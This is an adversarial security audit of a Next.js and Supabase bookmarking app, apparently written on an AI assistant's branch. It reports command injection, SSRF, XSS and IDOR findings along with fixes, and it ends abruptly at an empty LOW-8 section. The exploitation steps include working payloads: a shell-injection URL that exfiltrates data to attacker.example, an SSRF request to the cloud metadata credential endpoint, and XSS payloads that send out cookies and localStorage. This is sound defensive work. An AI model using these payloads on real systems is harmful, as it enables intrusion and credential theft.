# Marks — Adversarial Security Audit

**Scope:** Next.js 16 web app (`app/`, `lib/`, `middleware.ts`, `next.config.ts`), Supabase Postgres schema/RLS/migrations, and the browser‑extension coupling points. iOS/Chrome extension code is only referenced where the web backend trusts it.
**Auditor perspective:** Motivated attacker with the ability to sign up (Supabase self‑serve signup is on).
**Date:** 2026‑08‑27
**Branch:** `claude/security-audit-redteam-523y2`

---

## 1. Vulnerability Summary

| Severity | Count | Areas |
| --- | --- | --- |
| **Critical** | 3 | RCE via `execSync` + user URL, SSRF to metadata/loopback, PDF‑upload IDOR / storage-quota tampering |
| **High** | 6 | Stored XSS in search dropdown, stored XSS in reader (`content_html`, tweet HTML), unauthenticated admin‑client stats endpoint (RLS bypass + PII), CORS `*` on API, unbounded HTML/JSON write amplification, unrestricted Kindle JSON blob |
| **Medium** | 8 | ts_headline HTML injection, mass assignment on `PUT /api/bookmarks/[id]` (`user_id`), unbounded URL fetch (no size/timeout/redirect scheme filter), tweet oembed HTML entity double‑decode → XSS, log injection & error‑message reflection, no rate limiting / anti‑automation on any endpoint, insecure "auto‑archive fire‑and‑forget" auth bootstrapping, missing security headers (CSP, X‑Frame, HSTS, Referrer, Permissions) |
| **Low** | 8 | Weak password policy (6 chars), session `signOut` cookie handling, JS URL bookmarklet template, `middleware.ts` bypass when `Authorization` header set (still enforced downstream, but breaks defense‑in‑depth), overwriting Supabase cookie without `options`, deleted‑account race with in‑flight sessions, log verbosity, favicon proxy leak of hostname |
| **Info** | 4 | Dev/test scripts hold service‑role key, no CSRF token (mitigated by SameSite + JSON preflight), unversioned migrations, hard‑coded fallback `NEXT_PUBLIC_APP_URL` |

Total: **29 findings** (3 Critical, 6 High, 8 Medium, 8 Low, 4 Info).

---

## 2. Threat Model

### Attacker profiles
- **Anonymous:** can hit `/api/site-stats`, `/api/auth/*`, and unauthenticated crawlers of `middleware.ts` fast‑path.
- **Authenticated user (self‑serve signup):** primary attacker. Signup is public (`app/signup/page.tsx`), 6‑char minimum, no email verification enforced client‑side, no rate limit.
- **Malicious website operator:** controls a URL a target user later bookmarks. Their page's `<title>`, `og:*`, article body, and MIME are their input.
- **Tweet author / linked page:** feeds strings into `oembed.text`, `og:description`, and other parsed HTML the server writes back to the DB.
- **Extension‑spoofer:** any origin can `postMessage` "marks:*" messages that the reader/kindle pages act on.

### Trust boundaries
1. Browser cookies ⇄ Next.js middleware ⇄ Supabase SSR client.
2. `authorization: Bearer …` header (extension) ⇄ `lib/supabase-server.ts` (skips cookie flow).
3. **Service‑role client** (`lib/supabase.ts::createAdminClient`) — used in `/api/site-stats` and `/api/auth/delete-account`, **bypasses RLS**.
4. Server‑side outbound `fetch` to arbitrary URLs (extract, metadata, suggest‑tags, archive downloader, YouTube oEmbed, Twitter oEmbed).
5. `execSync("curl … $tweetUrl")` — shell.
6. Supabase Storage bucket `user-files` with per‑user path prefix (`${userId}/…`).

### Sensitive assets
- Auth JWT / Supabase session cookies.
- Anthropic (`ANTHROPIC_API_KEY`), Supabase service role, Resend keys (env).
- All users' bookmarks, notes (`description`), Kindle highlight blobs, PDFs, HTML archives.
- Vercel/Cloudflare instance metadata (IMDS 169.254.169.254), internal service ports on the serverless runtime.

---

## 3. Detailed Findings

### CRIT‑1. Remote Command Execution via `execSync` on user‑controlled tweet URL

**Severity:** Critical
**Component:** `lib/twitter.ts::resolveTweetLinkTitle` (called from `app/api/bookmarks/route.ts:52` and `app/reader/[id]/page.tsx:155`)
**CWE:** CWE‑78 OS Command Injection.

```ts
// lib/twitter.ts:60‑64
const { execSync } = await import("child_process");
const html = execSync(
  `curl -sL --http1.1 -H "User-Agent: Googlebot/2.1" -H "Accept: text/html" "${tweetUrl}"`,
  { timeout: 10000 },
).toString();
```

`tweetUrl` is the user‑supplied `body.url` passed unmodified through `POST /api/bookmarks` (via `resolveTweetLinkTitle(oembed.text, body.url)`) and again on `/reader/[id]` when the stored bookmark title matches `^@\w+:\s*https?://` (server‑side render).

The upstream `isTweetUrl()` check parses the URL and only asserts that host is `x.com`/`twitter.com` and that path contains `/status/`. `new URL()` accepts many shell‑special characters in the **path, query, and fragment** — notably ``$( )`` `` ` `` `;` `&` `|` `\n` — none of which force the constructor to throw. Because the URL is interpolated into a **double‑quoted shell string**, `$( … )` command substitution and backtick execution are performed by the shell.

**Exploitation (authenticated attacker):**
1. `POST /api/bookmarks` with body:
   ```json
   {
     "url": "https://x.com/anyone/status/1$(curl -s http://attacker.example/x?d=$(id|base64 -w0))",
     "title": "@x: https://example.com",
     "type": "tweet",
     "description": "https://any.url"
   }
   ```
2. `isTweetUrl` passes (host is `x.com`, path contains `/status/`). Depending on how far the flow gets, either the POST path (`resolveTweetLinkTitle(oembed.text, body.url)`) or the first server render of `/reader/[id]` will hit `execSync`.
3. Backend shell executes `id`, base64‑encodes it, and exfiltrates via `curl` to the attacker. Any command available in the Vercel/Node sandbox runs — including reading `process.env` (`SUPABASE_SERVICE_ROLE_KEY`, `ANTHROPIC_API_KEY`, `RESEND_API_KEY`).

**Impact:** Full compromise of the serverless runtime including all secrets and the ability to hit Supabase with the service‑role key (bypasses RLS → total user‑data compromise). This is a one‑shot pivot from "any signed‑up user" to "root of the product."

**Fix:**
- Replace `execSync("curl …")` with `fetch()` (Node has it natively; the reason cited in the comment — HTTP/1.1 behavior of x.com — can be handled by setting the `undici` dispatcher's `allowH2: false` or using a small `http.request` wrapper).
- If shell must be used, use `execFile(["curl", "-sL", "--http1.1", "-H", …, url])` (no shell, argv form). Never interpolate untrusted data into a shelled string.
- Add an allow‑list of URL characters after `new URL()` normalization; reject anything outside `[A‑Za‑z0‑9\-._~:/?#[\]@!$&'()*+,;=%]` — even then argv‑form is required.

---

### CRIT‑2. SSRF: server fetches attacker‑controlled URLs with no scheme/host filter

**Severity:** Critical
**Component:**
- `lib/extract.ts::tryReadability`, `tryArchivePh`, `tryWaybackMachine`, `extractMetadata`, `extractFromHtml` (indirect)
- `lib/suggest-tags.ts::suggestTags`
- `lib/youtube.ts::fetchYouTubeMetadata`
- `lib/twitter.ts::fetchTweetOembed`
- `app/api/bookmarks/[id]/archive/route.ts` — image/media downloader loops (`for (mediaUrls)` → `fetch(mediaUrls[i])`; and `fetch(imageUrl)` for og:image)
- `app/api/pdf/[id]/route.ts` — `fetch(signedUrl)` (Supabase signed URL only, less severe)

**CWE:** CWE‑918 SSRF.

There is no validation of the URL scheme or destination host before `fetch()`. `AbortSignal.timeout(15000)` limits duration but not target. The Next.js runtime on Vercel can reach:
- Cloud provider **instance‑metadata service** (`http://169.254.169.254`) — on AWS returns instance role credentials; on GCP returns identity tokens.
- The Vercel edge network's `localhost`, `::1`, `127.0.0.1` sidecars.
- Private RFC1918 ranges reachable from the runtime (Supabase VPC, Redis, internal admin dashboards).

**Exploitation:**
1. Sign up. `POST /api/bookmarks` with `url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`.
2. The auto‑archive path runs `extractArticle` → `tryReadability` → `fetch(url)` server‑side. The HTML response (JSON containing AWS temp creds) is fed into `Readability`, then persisted to `archived_content.content_html/content_text`.
3. Attacker reads their own bookmark's archived content back via `/reader/[id]` or the search endpoint and recovers metadata + creds.

Additional vectors:
- `og:image` inside a controlled page is followed unconditionally → force GETs of arbitrary internal URLs (blind SSRF), stored in the attacker's `stored_media` bucket as `thumbnail.jpg`.
- `type_metadata.media_urls` (arbitrary array in body) is iterated in the tweet‑archive branch and each URL is fetched → 10s per host × arbitrary count. No de‑dup, no host filter.

**Impact:** Cloud credential theft, internal service enumeration, blind SSRF‑as‑a‑service (attacker uses the product to hit third parties).

**Fix:**
- Introduce a strict egress filter (single helper). Steps:
  1. `new URL(u)` and reject unless `protocol === "http:" || "https:"`.
  2. Resolve DNS (with a bounded resolver) and reject any A/AAAA in `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`, `fe80::/10`, `100.64.0.0/10`. Also reject unspecified `0.0.0.0`, link‑local, and multicast.
  3. Follow redirects yourself (manual, `redirect: "manual"`), re‑validating every hop against the same list.
  4. Cap response body size (e.g. 5 MiB) via a streaming reader.
- Restrict `type_metadata.media_urls`: enforce max length, per‑host allow‑list (twimg.com), and the same DNS check.

---

### CRIT‑3. PDF‑upload IDOR & storage‑quota tampering (`/api/upload-pdf`)

**Severity:** Critical
**Component:** `app/api/upload-pdf/route.ts`

The route accepts JSON `{ storagePath, filename, fileSize }` directly from the client with **no validation that `storagePath` starts with the caller's `user.id`** and **no server‑side re‑measurement of `fileSize`**.

```ts
const { storagePath, filename, fileSize } = body;
…
const { data: fileData } = await supabase.storage.from("user-files").download(storagePath);
…
await supabase.from("stored_media").insert({ …, storage_path: storagePath, file_size: fileSize || buffer.length, … });
await supabase.rpc("increment_storage_usage", { p_user_id: user.id, p_bytes: fileSize || buffer.length });
```

**Exploitation A — Read another user's PDF text:**
1. Attacker signs up. Learns a victim's uploaded path shape via storage error messages (`${victimUserId}/${bookmarkId}/document.pdf`); user IDs leak from `/api/site-stats` (see High‑3).
2. `POST /api/upload-pdf` with `{ storagePath: "<victimUUID>/<bookmarkId>/document.pdf", filename: "x.pdf", fileSize: 1 }`.
3. The server downloads the victim's PDF via the **cookie‑authenticated Supabase client**. Supabase Storage RLS on the `user-files` bucket must be examined — the migration file for storage bucket RLS was not present in the repo. If bucket policy is `SELECT USING (auth.uid()::text = split_part(name, '/', 1))`, the download would 403. **If** the bucket lacks this policy (common oversight), the attacker fully reads the victim's PDF.
4. Even if the download fails, the attacker's own `stored_media` row now points at the victim's path, and the `/api/pdf/[id]` route later issues signed URLs for that path — bypassing bucket RLS via a signed URL.

**Exploitation B — Storage‑quota tampering (guaranteed to work):**
1. `POST /api/upload-pdf` with `{ storagePath: "<attacker>/anything", fileSize: -999999999999 }`. The server calls `increment_storage_usage(p_bytes: -999999999999)`. The RPC applies `GREATEST(bytes_used + p_bytes, 0)`, so total is floored to 0 — attacker resets their meter, uploading unlimited data. Conversely `+999_999_999_999` DoS‑bricks any other user if IDOR is chainable.

**Exploitation C — DoS via PDF‑parse:**
Attacker points `storagePath` to a huge non‑PDF blob (or, if the storage upload endpoint isn't gated, uploads a PDF bomb). `pdf-parse` runs in‑process without a timeout → `maxDuration = 60` s of CPU per request. No rate limit.

**Impact:** Cross‑tenant data disclosure (probable), quota tampering (certain), CPU/wall‑clock DoS (certain).

**Fix:**
- Reject any `storagePath` that does not begin with ``${user.id}/`` (also normalize `..` / duplicated slashes first).
- Ignore client‑supplied `fileSize`; use `buffer.length` (which is server‑measured).
- Clamp `increment_storage_usage` to `p_bytes >= 0` server‑side (add `p_bytes = GREATEST(p_bytes, 0)` at the top of the RPC).
- Confirm and, if missing, add Supabase Storage bucket policy `USING (auth.uid()::text = split_part(name,'/',1))` for both `SELECT` and `INSERT/UPDATE/DELETE`.
- Add a body‑size cap on `pdfParse` (reject > MAX_FILE_SIZE bytes) and wrap parse in a `Promise.race` timeout.

---

### HIGH‑1. Stored XSS in the global search dropdown via `dangerouslySetInnerHTML` of `ts_headline`

**Severity:** High
**Component:** `app/search-bar.tsx:98‑110`

```tsx
<span dangerouslySetInnerHTML={{ __html: r.headline_title }} />
…
<span dangerouslySetInnerHTML={{ __html: r.headline_content }} />
```

Postgres `ts_headline()` (in `supabase-migration-search.sql`) wraps matches in literal `<mark>…</mark>` — **it does not HTML‑escape the surrounding text**. `title`, `description`, and `content_text` come from:
- Attacker‑controlled webpages (`og:title`, `<title>`), fetched via `extractMetadata`.
- Attacker‑controlled tweets/oembed.
- Attacker‑controlled article body (via Readability, which is a readability parser, not a security sanitizer — event handlers on preserved tags, `svg` payloads, and mutation‑XSS gadgets bypass it in practice).

**Exploitation:**
1. Attacker publishes a page whose `<title>` is `X<img src=x onerror=fetch("/api/bookmarks?tag=`+document.cookie+`")>` (or any XSS payload).
2. Victim bookmarks the page via extension/bookmarklet. `extractMetadata` writes the raw title into `bookmarks.title`.
3. Victim later searches. `ts_headline` returns `X<img src=x onerror=…>` verbatim (only the matched substring is wrapped in `<mark>`), and `dangerouslySetInnerHTML` injects it into the DOM.

**Impact:** Full account takeover. Session cookies are HttpOnly (Supabase default), but the exploit doesn't need them — it can call any `/api/*` endpoint from the same origin (e.g., dump all bookmarks / notes / Kindle highlights, or `POST /api/auth/delete-account`).

**Fix:**
- Do not use `ts_headline` output as raw HTML. Either escape server‑side (return the plain text and highlight ranges as `[start, end]` offsets, then wrap in `<mark>` client‑side after React‑escaping the text), or run the DB output through DOMPurify with an allow‑list of only `<mark>` on the client before injecting.
- Best: emit `<mark>` markers with sentinels the DB can't produce, then split‑and‑map in React (`{parts.map(p => p.mark ? <mark>{p.text}</mark> : p.text)}`) so React does the escaping.

---

### HIGH‑2. Stored XSS in the reader page — archived `content_html`, tweet `content_html`, and injected page HTML

**Severity:** High
**Component:** `app/reader/[id]/page.tsx`
- Line 288‑291: `<div dangerouslySetInnerHTML={{ __html: contentHtml }} />` for tweets, where `contentHtml` comes from `archived.content_html` **or** `bookmark.type_metadata.content_html` (raw JSON body).
- Line 376‑378: `<div dangerouslySetInnerHTML={{ __html: cleanLinkedInHtml(archived.content_html, bookmark.url) }} />` for articles.
- `app/reader/[id]/pdf-viewer.tsx:75‑77`: same for PDF text view.

`archived.content_html` sources:
- `parseWithReadability(html, url)` (Mozilla Readability). Readability strips scripts but preserves many tags (`<iframe srcdoc>`, `<svg><use href>`, `<style>` gadgets, `<a onclick>`‑style attrs in some versions) — this is a readability parser, not a security sanitizer. There are known DOMPurify‑style bypasses that pass through it.
- Hand‑built `<blockquote><p>${tweetText.replace(/\n/g,"<br>")}</p><footer>…</footer></blockquote>` in `archive/route.ts:62` — **no escaping of `tweetText` or `author`**. `tweetText` originates from the tweet oembed after entity‑decoding (see High‑5), from `bookmark.description` (user input via the API), or from `bookmark.type_metadata.tweet_text` (arbitrary JSON via the extension).
- `type_metadata.content_html` written by the extension → also rendered raw.

**Exploitation A — Cross‑user via bookmark URL a friend saves.** Attacker sets the target page's article body to include `<img src=x onerror=…>` inside a normal‑looking `<p>` (Readability keeps `img` and event attributes it doesn't recognize). Victim bookmarks; auto‑archive runs; victim opens the reader → XSS in victim's authenticated origin.

**Exploitation B — Self‑CSRF‑then‑XSS.** Even without a "cross user" primitive, an attacker who can trick a victim into saving a page they crafted (a common phishing prerequisite) escalates from "arbitrary link save" to "arbitrary JS in the SaaS."

**Impact:** Same as HIGH‑1 — full account takeover, mass data exfiltration.

**Fix:**
- Server‑side sanitize `content_html` before persisting *and* before rendering, using an allow‑list HTML sanitizer (e.g., DOMPurify's server build, `sanitize-html`, or `isomorphic-dompurify`). Strip `<script>`, `<iframe>`, `<object>`, event handlers, `javascript:` URLs, `srcdoc`, `data:` URLs in image sources, `<meta>`, `<link>`, `<style>` (or use CSSOM sanitization), `<svg>` `<use href>` external references.
- HTML‑escape `tweetText` and `author` before interpolating into `tweetHtml` in `archive/route.ts:62`.
- Do not accept `type_metadata.content_html` from clients — reconstruct HTML from `tweet_text` (plain) + `media_urls` server‑side.
- Add a strict CSP (`default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'`) as defense in depth — see Medium‑8.

---

### HIGH‑3. `/api/site-stats` uses the service‑role client with no auth and leaks per‑user data

**Severity:** High
**Component:** `app/api/site-stats/route.ts`

```ts
export async function GET() {
  const supabase = createAdminClient(); // SERVICE ROLE — bypasses RLS
  … const { data: userRows } = await supabase.from("bookmarks").select("user_id").limit(10000);
  … const { data: allBookmarks } = await supabase.from("bookmarks").select("user_id, created_at").order("created_at");
```

There is **no `requireUser()` check**, the route is served under CORS `Access-Control-Allow-Origin: *`, and it queries with the service‑role key. What leaks:

- Cardinality of user base (`total_users`).
- Per‑user IDs of the first 10,000 users (via `userRows.map(r => r.user_id)`), directly returned in the aggregate? No — only counts. But the query pulls user IDs into memory and could be trivially widened by an operator misedit.
- Time series of new‑signup dates and volume (competitive intel).
- Per‑day active‑user counts.

More importantly, the **existence of this pattern** — a public route that instantiates the service role — is a footgun. Any future logic bug (parameter injection, argument routing) escalates directly to full DB access with RLS off.

**Exploitation:** `curl https://<site>/api/site-stats` from anywhere. If a bug adds a `?user_id=` filter in the future, that filter becomes an admin‑level data reader.

**Impact:** Info disclosure now; latent privilege escalation risk long term.

**Fix:**
- Require an admin session (or a signed internal token) before returning stats.
- Compute these metrics with the caller's (or an anonymous cookie‑session) supabase client + a `SECURITY DEFINER` SQL function that returns **only aggregates**, never per‑user IDs, and clamps time ranges.
- Never instantiate the service‑role client in a route reachable by unauthenticated requests. Move it to a scheduled job that writes into a materialized `site_stats` table.
- Regardless, remove `Access-Control-Allow-Origin: *` from this path.

---

### HIGH‑4. `Access-Control-Allow-Origin: *` on all `/api/*`

**Severity:** High
**Component:** `next.config.ts`

```ts
{ key: "Access-Control-Allow-Origin", value: "*" },
{ key: "Access-Control-Allow-Methods", value: "GET, POST, PUT, DELETE, OPTIONS" },
{ key: "Access-Control-Allow-Headers", value: "Authorization, Content-Type" },
```

- With `*` there is no `Access-Control-Allow-Credentials`, so cookies aren't automatically included in cross‑origin `fetch()`. That's the mitigation the current code depends on.
- However any attacker page can **read** every unauthenticated response (e.g., `/api/site-stats`) and — more importantly — any endpoint that a browser will authenticate via a bearer header the attacker can obtain. The Chrome extension uses `Authorization: Bearer <supabase_access_token>`; the same token in `localStorage` (Supabase JS puts it there when using the browser client) is reachable via **any XSS** (High‑1/2) and can then be sent from any origin because CORS accepts `*`.
- Even without XSS, an attacker site can serve as a **DNS‑rebinding target** to attack the site's own users through `localhost` deployments during development.
- Public unauthenticated endpoints (like site‑stats) are freely embeddable by third parties (data scraping).

**Impact:** Amplifies impact of every XSS; enables cross‑origin scraping and dev‑env DNS rebind.

**Fix:**
- Set origin dynamically to the request's Origin **only if it appears in an allow‑list** (`https://getmarks.sh`, `chrome-extension://<known-ext-id>`, `https://marks-drab.vercel.app`), else omit.
- Do not send `Access-Control-Allow-Credentials: true` unless you truly need cross‑origin cookie auth (you don't — extension uses bearer, web uses same‑origin).
- Remove `Authorization` from `Allow-Headers` for browser origins that don't need it (keep for extension origin only).

---

### HIGH‑5. Tweet oembed double‑decodes HTML entities → XSS payload survives sanitization

**Severity:** High
**Component:** `lib/twitter.ts::fetchTweetOembed`

```ts
const text = (data.html as string)
  .replace(/^[\s\S]*?<blockquote[^>]*><p[^>]*>/, "")
  .replace(/<\/p>[\s\S]*$/, "")
  .replace(/<br\s*\/?>/g, "\n")
  .replace(/<a[^>]*>(.*?)<\/a>/g, "$1")
  .replace(/<[^>]+>/g, "")
  .replace(/&amp;/g, "&")
  .replace(/&lt;/g, "<")
  .replace(/&gt;/g, ">")
  …
```

Tags are stripped **before** entities are decoded. So `<blockquote><p>&lt;script&gt;alert(1)&lt;/script&gt;` → after tag strip → `&lt;script&gt;alert(1)&lt;/script&gt;` → after entity decode → `<script>alert(1)</script>`. This live `<script>` string is then written into `bookmark.description` (`POST /api/bookmarks`) and into `archived_content.content_html` as `<blockquote><p><script>alert(1)</script>…` in the archive route, and finally rendered by the reader via `dangerouslySetInnerHTML`.

**Exploitation:** Publish a tweet whose text is `&lt;script&gt;fetch("//attacker/"+localStorage.marks)&lt;/script&gt;` (Twitter's own display escapes it, but the oembed `html` field preserves entities). Any Marks user who bookmarks that tweet URL runs the payload.

**Impact:** Reliable, cross‑user, low‑effort stored XSS via Twitter (Twitter itself is not compromised — Twitter is just the transport).

**Fix:**
- Decode entities first, then strip tags, then re‑encode entities before storing.
- Better: parse `data.html` with a DOM parser (linkedom is already a dep), grab `blockquote > p` textContent, discard the rest.

---

### HIGH‑6. `PUT /api/bookmarks/[id]` mass assignment (`user_id`, `created_at`)

**Severity:** High
**Component:** `app/api/bookmarks/[id]/route.ts:21-45` and `lib/db.ts::updateBookmark`

```ts
const bookmark = await updateBookmark(parseInt(id, 10), {
  title, url, description, is_read, is_archived, tags,
  ...(body.type !== undefined && { type: body.type }),
  ...(body.type_metadata !== undefined && { type_metadata: body.type_metadata }),
});
```

`updateBookmark` in `lib/db.ts` does `supabase.from("bookmarks").update({ ...fields, updated_at: … }).eq("id", id)` — it forwards whatever `fields` contains. The route filters top‑level keys but leaves `type_metadata` as a free‑form JSON write path. RLS on `bookmarks` protects **who** can update a row, but does not stop the row's owner from **changing arbitrary column values** if the client passes them. And `db.ts::createBookmark` accepts `user_id: input.user_id` — currently `user.id` in the API — but if any future route forwards `body.user_id`, cross‑user impersonation follows immediately.

Concrete attack surface today:
- `type_metadata` is rendered via `dangerouslySetInnerHTML` on the reader page (`content_html` field). A user can set it to arbitrary HTML on their own bookmark → self‑XSS. Chained with a shared reader URL / `/actions` page (which fetches all enrichments), can hit an admin/audit viewer.
- `type` change to `"tweet"` triggers oembed + AI enrichment against any URL — SSRF/AI cost amplification.

**Fix:**
- Whitelist columns at the DB layer of `updateBookmark`: pass only the fields you explicitly expect (`title`, `url`, `description`, `is_read`, `is_archived`, `type`, `type_metadata`), and never spread untrusted objects.
- Sanitize `type_metadata` shape: enforce a schema per `type` (Zod/valibot), reject unknown keys, cap string lengths, and forbid a client‑supplied `content_html`.

---

### MED‑1. `ts_headline` HTML injection into the DB‑generated `headline_*` columns (defense‑in‑depth for HIGH‑1)

**Severity:** Medium (rolled into HIGH‑1's exploit, but the fix is architectural)
**Component:** `supabase-migration-search.sql`

`ts_headline` is a text‑layer highlighter — it takes plain text and wraps matches in `StartSel/StopSel`. Passing raw `title`/`description`/`content_text` (which for this app can contain HTML from Readability output stored in `content_text` after `stripHtml`) means the DB emits HTML that mixes trusted highlight markers with untrusted content.

**Fix:** In the SQL function, wrap inputs with a hypothetical `plainto_html_escaped(...)` — since Postgres has no builtin, do the escaping in the calling layer *before* rendering (see HIGH‑1 fix) or store a pre‑escaped mirror column for search only.

---

### MED‑2. `middleware.ts` fast‑path lets requests through when only an `Authorization` header is present

**Severity:** Medium (mitigated downstream; still a defense‑in‑depth break)
**Component:** `middleware.ts:19-21` and `middleware.ts:60-63`

```ts
if (path.startsWith("/api/") && request.headers.get("authorization")) {
  return NextResponse.next({ request });
}
```

Any request to `/api/*` with **any non‑empty** `Authorization` header (even garbage) bypasses middleware auth. The intent is to defer to `requireUser()` inside each route. In practice this means:
- The middleware is not a security boundary for `/api/*` — every route must remember to call `requireUser()`. Missing one (e.g., a future route) will silently be reachable.
- No cost is imposed on token‑stuffing / brute forcing: attackers can hammer any API path with fake bearer tokens and the middleware doesn't slow them down.

**Fix:** Have middleware validate the bearer token (call `supabase.auth.getUser(token)`) before letting the request through, or at minimum require the token to look like a Supabase JWT (three base64url segments). Better: run auth centrally, and skip `requireUser()` boilerplate in every route.

---

### MED‑3. No rate limiting on any endpoint

**Severity:** Medium
**Component:** All of `app/api/*`, `app/login`, `app/signup`.

The Supabase client handles auth over the wire, so raw password brute force lands at Supabase, but everything else — signup floods, bookmark POST floods (each triggers an Anthropic call → **billable AI cost DoS**), archive fetches (SSRF request amplification against third parties), YouTube/Twitter oembed floods — is uncapped.

Notably: `POST /api/bookmarks` triggers `enrichTweet` / `suggestTags` (Anthropic calls). An attacker can spend the operator's Anthropic budget by looping the endpoint.

**Fix:** Vercel Edge KV / Upstash rate limits per‑IP and per‑`user.id`; budget cap for Anthropic per‑user per day.

---

### MED‑4. Auto‑archive "fire‑and‑forget" fetch relies on hard‑coded origin + optional Authorization header

**Severity:** Medium
**Component:** `app/api/bookmarks/route.ts:83-95`

```ts
const appUrl = process.env.NEXT_PUBLIC_APP_URL || "https://marks-drab.vercel.app";
const authHeader = req.headers.get("authorization") || "";
fetch(`${appUrl}/api/bookmarks/${bookmark.id}/archive`, {
  method: "POST",
  headers: { Authorization: authHeader, "Content-Type": "application/json" },
  body: JSON.stringify({ force_archive: false }),
}).catch(() => {});
```

Issues:
- The URL falls back to a public Vercel preview (`marks-drab.vercel.app`) even in production — a request from the current instance ends up served by a different (possibly older) instance, whose behavior is unknown.
- The internal call forwards the caller's Authorization header verbatim. For cookie‑authed callers, `authHeader` is empty → the archive endpoint's `requireUser()` fails → the auto‑archive is a silent no‑op. That is functionally broken and hides misconfiguration.
- If someone later replaces the empty header with the service‑role key, this becomes an authenticated fan‑out on behalf of any user.

**Fix:** Do the archive work in‑process (or an explicit background queue) — do not HTTP‑bounce through a hard‑coded URL. Never trust `NEXT_PUBLIC_APP_URL` as an auth boundary.

---

### MED‑5. Unbounded Kindle blob write & reflection

**Severity:** Medium
**Component:** `app/api/kindle/route.ts` (PUT)

Validates only `body.data.books` is an array. No size cap; the entire blob is stored in a `jsonb` column and reflected verbatim on GET. A malicious extension (or a malicious page tricking the extension) can:
- Store an enormous blob (DB bloat, egress cost) — 1 GiB per row is possible until Supabase quota kicks in.
- Store attacker HTML inside `book.title`, `book.author`, `highlights[].text`, `highlights[].note`. The `app/kindle/page.tsx` renders these through React (`{h.text}`, `{book.title}`), so React escapes them — no XSS today. But `book.cover` is used as `<img src={selectedBook.cover}>` **without validation** → attacker can force GETs / track viewer via a controlled image URL, or `javascript:` payloads if a future refactor uses `<a href={book.cover}>`.

**Fix:** Cap request body (`Content-Length < 1 MiB`), validate shape (max books, max highlights, string length caps), whitelist `book.cover` to `https://images-*.amazon.com`.

---

### MED‑6. Error‑message reflection & log injection

**Severity:** Medium
**Component:** `app/api/bookmarks/route.ts:154-162`, and generally `console.error("... error:", err)` across API routes.

The bookmark POST reflects `PostgrestError.message` back to the client:
```ts
return NextResponse.json({ error: msg }, { status: 500 });
```
Postgres messages can leak schema (`column "x" of relation "…" violates …`), and log strings are user‑controlled (URL, title, description are logged). This aids attacker recon and enables log‑analysis poisoning if logs are shipped to a downstream that trusts formatting.

**Fix:** Never reflect DB errors verbatim — log a request‑ID server‑side and return a generic error to clients. Sanitize logged strings (replace CR/LF, cap length).

---

### MED‑7. Unbounded fetch response body + redirect following

**Severity:** Medium
**Component:** `lib/extract.ts`, `lib/suggest-tags.ts`, archive route image loop.

`fetch(url, { redirect: "follow" })` combined with `res.text()` will happily read a hostile server's multi‑gigabyte response into memory. Timeout is only 15 s. Combined with SSRF (CRIT‑2), an internal service (e.g., a proxy that hangs open sockets) becomes a memory bomb.

**Fix:** Cap response body via streaming (`res.body?.getReader()` with a byte counter, abort if > 2 MiB). Set `redirect: "manual"` and re‑validate each hop for SSRF filtering.

---

### MED‑8. No CSP, X‑Frame‑Options, HSTS, Referrer‑Policy, or Permissions‑Policy

**Severity:** Medium
**Component:** `next.config.ts`, `app/layout.tsx`

The only headers configured are the permissive CORS block. Missing:
- `Content-Security-Policy` — would blunt HIGH‑1 / HIGH‑2 XSS.
- `X-Frame-Options: DENY` or `frame-ancestors 'none'` — clickjacking (e.g., trick a user into hitting `/api/auth/delete-account` via a hidden iframe + XSS chain).
- `Strict-Transport-Security` — Vercel serves HSTS by default at edge, but explicit is safer.
- `Referrer-Policy: no-referrer` — Marks fetches many third‑party sites; leaking `getmarks.sh/reader/<id>` in the Referer to arbitrary hostile domains leaks the bookmark ID.
- `Permissions-Policy` — off‑by‑default features are still exposed to embedded content.

**Fix:** Add all of the above in `next.config.ts`.

---

### LOW‑1. Weak password policy

**Severity:** Low
**Component:** `app/signup/page.tsx:75` — `minLength={6}`

6‑character passwords are trivially guessable / brute‑forceable given Supabase's rate limiting is per‑IP.

**Fix:** Enforce ≥ 12 chars server‑side (Supabase Auth password policy).

---

### LOW‑2. `signOut` cookie handling

**Severity:** Low
**Component:** `app/api/auth/signout/route.ts`

Redirect is 302 (via `NextResponse.redirect`) rather than 303, and does not explicitly clear the client cookies (Supabase SSR does clear via `setAll`, but if the browser doesn't consume the redirect body the caller can't tell). Not exploitable, but the assumption‑of‑cookie‑clearing is fragile.

---

### LOW‑3. Bookmarklet template concatenation

**Severity:** Low
**Component:** `app/bookmarklet.tsx`

The bookmarklet URL is built at runtime and inserted into a `href="javascript:…"` attribute. Everything interpolated is `window.location.origin` (trusted). Fine today. But if any dynamic user data ever gets interpolated in there, it's a persistent XSS gadget for anyone dragging the bookmarklet.

**Fix:** Encode all interpolated pieces via `encodeURIComponent` (already done) and avoid interpolating anything but constants.

---

### LOW‑4. `setAll` in middleware drops cookie options on the request cookie mirror

**Severity:** Low
**Component:** `middleware.ts:43-51`

```ts
cookiesToSet.forEach(({ name, value, options }) =>
  request.cookies.set(name, value), // options dropped here
);
```

The response cookies do get options, so this is not a hard bug — it's the request mirror that's affected, which controls how downstream `getUser()` reads the auth token. Ends up harmless in practice, but the pattern is easy to break.

---

### LOW‑5. Delete‑account race

**Severity:** Low
**Component:** `app/api/auth/delete-account/route.ts`

Deletes rows, then calls `supabase.auth.admin.deleteUser`. Any concurrent request from the same user (already in flight) can create rows *after* the deletes — leaving orphaned `bookmark_tags`/`archived_content`/`stored_media` referencing a now‑deleted user.

**Fix:** Order operations: `deleteUser` first (revokes tokens), then bulk delete rows. Or wrap in an admin RPC in a single transaction.

---

### LOW‑6. Verbose console logging of user content

**Severity:** Low
**Component:** Many API routes (`console.error("... error:", err)`, `console.error("Enrichment upsert error:", error)`).

If logs are shipped to a third‑party aggregator, user URLs/titles/notes leak. Also enables log‑injection (CRLF) since user strings aren't sanitized before logging.

---

### LOW‑7. Favicon proxy leaks visited hostnames

**Severity:** Low
**Component:** `app/bookmark-item.tsx:171-178`

`<img src="https://www.google.com/s2/favicons?sz=32&domain=${hostname}">` — Google receives every hostname the user has bookmarked. This is a Marks‑user tracking leak documented by Google's ToS. Consider self‑hosting favicons or hashing.

---

### LOW‑8. `middleware.ts` treats missing auth cookie as unauthenticated only on the request cookie name prefix

**Severity:** Low
**Component:** `middleware.ts:11-13`

